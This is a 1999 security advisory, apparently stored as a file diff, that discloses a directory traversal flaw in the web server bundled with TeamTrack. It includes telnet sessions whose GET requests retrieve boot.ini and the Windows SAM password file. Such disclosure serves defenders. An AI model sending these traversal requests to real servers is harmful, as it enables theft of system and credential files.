@@ -1,0 +1,139 @@
+--- Advisory RFP9904 --------------------------------- rfp.labs -----------
+
+        Unrestricted file request via TeamTrack's included webserver
+                    (TeamTrack webserver vulnerability)
+
+---------------------------------- rain forest puppy / rfp@wiretrip.net ---
+
+Table of contents:
+        - 1. Revoke/update of RFP9903
+        - 2. Problem
+        - 3. Solution
+        - 4. Miscellanous Updates (From RFP9903)
+
+----------------------------------------------------------------------------
+
+October is Octoberfest Advisory month: one rfp.labs release planned each
+week
+for the whole month of October!  (Now, let's see if I can pull it off....)
+
+-----------------------------------------------------------------------------
+
+----[ 1. Revoke/Update of RFP9903
+
+        Ok, I released RFP9903 detailing a little bug about insecure
+AeDebug registry permissions yesterday.  Unfortunately, I did not do
+thorough homework, as Mnemonix (who is always two steps ahead of me in my
+though processes :) had reported this vulnerability as early as July 1998
+(!) to NTBugtraq.  Apologies and credits then to Mnemonix.  RFP9903 was
+cancelled for distribution, but it may have leaked out in a few channels.
+So, to save face, I am releasing another advisory in it's place, in
+efforts to maintain the Octoberfest advisory festival!  Anyways, onto the
+info (don't want to be as long as my RDS advisory. ;)
+
+
+----[ 2. Problem
+
+        TeamTrack server, published by TeamShare, is available from
+www.teamtrack.com.  It's purpose, to quote the web search engine spam
+located at the bottom of their website:
+
+teamshare teamtrack web based defect bug tracking track teamshare
+teamtrack web based defect bug tracking track teamshare teamtrack
+web based defect bug tracking track
+
+        The problem is with the included web server they use to access the
+database--it allows unrestricted retrieval of any file on the filesystem.
+Observe this session:
+
+[rfp@wicca.rfp.labs rfp]$ telnet lughnasad.rfp.labs 80
+Trying 10.10.10.9...
+Connected to lughnasad.rfp.labs.
+Escape character is '^]'.
+GET /../../../../../../../boot.ini HTTP/1.0
+
+HTTP/1.0 200 OK
+Server: TeamTrack/3.00(3097)
+Date: Sat, 02 Oct 1999 04:19:48 GMT
+Last-Modified: Sat, 02 Oct 1999 04:19:48 GMT
+Accept-Ranges: bytes
+Last-Modified: Thu, 29 Jul 1999 03:56:08 GMT
+Content-Length: 382
+Content-Type: text/html
+
+[boot loader]
+timeout=30
+default=multi(0)disk(0)rdisk(0)partition(1)\WINNT
+[operating systems]
+multi(0)disk(0)rdisk(0)partition(1)\WINNT="Windows NT Server, Enterprise
+Edition Version 4.00"
+multi(0)disk(0)rdisk(0)partition(1)\WINNT="Windows NT Server, Enterprise
+Edition Version 4.00 [VGA mode]" /basevideo /sos
+Connection closed by foreign host.
+
+
+        In case you haven't figured it out already, it runs on NT, and as
+a service.  This means it has system access to any file.
+
+[rfp@wicca.rfp.labs rfp]$ telnet lughnasad.rfp.labs 80
+Trying 10.10.10.9...
+Connected to lughnasad.rfp.labs.
+Escape character is '^]'.
+GET /../../../../../winnt/repair/sam._ HTTP/1.0
+
+HTTP/1.0 200 OK
+Server: TeamTrack/3.00(3097)
+Date: Sat, 02 Oct 1999 04:40:30 GMT
+Last-Modified: Sat, 02 Oct 1999 04:40:30 GMT
+Accept-Ranges: bytes
+Last-Modified: Thu, 29 Jul 1999 03:43:10 GMT
+Content-Length: 3330
+Content-Type: text/html
+
+,IP&f$$hive$$.tm}h <....data cut...don't want you seeing my SAM!...>
+
+
+----[ 3. Solution
+
+        TeamTrack also includes the option to use Netscape
+FastTrack/Enterprise or IIS instead.  I suggest you look into this.  The
+SP4 readme includes information/instructions on how to migrate to one of
+these webservers.
+
+
+----[ 4. Miscellaneous Updates (From RFP9903)
+
+        - Like I mentioned before, October is Octoberfest Advisory month.
+I'm going to attempt to release something every week.  Hopefully you'll
+find the stuff worthwhile...I think there's some planned goodies.  A
+little NT, a little unix, a little web, all good. :)
+
+        - My website is narrowing completion!  Many people have been
+wondering if I have archives of my releases, programs, research, etc.  The
+answer is 'yes', and soon it will be made public.  More information on
+this in the next release (next week :)
+
+        - Many people have emailed me wondering about the release of
+version two of the RDS script.  This is one of the planned releases. 
+Gimme time to finish coding it. 
+
+        - Why the formal advisory numbering system and format?  Well, it's
+really to better organize my own personal filing, really.  And you'll see
+how it fits into my website design in a little bit.  In case you're
+wondering, RFP9901 was the ODBC article posted May 25th, and RFP9902 was
+the RDS posted June 23rd? (or July 23rd).
+
+        - Phrack 55 is out--good stuff.  www.phrack.com Packetstorm is
+back.  packetstorm.securify.com.  Technotronic still rules. 
+www.technotronic.com. 
+
+        - Practical application of one of the perl problems I talked about
+in Phrack 55 landed JFS $1,000 for hacking securelinux.hackpcweek.com. 
+Congrats, JFS. 
+
+
+--- rain forest puppy / rfp@wiretrip.net --------------- ADM / wiretrip ---
+
+                        Twelve-fifteen, press return.
+
+--- Advisory RFP9904 --------------------------------- rfp.labs -----------
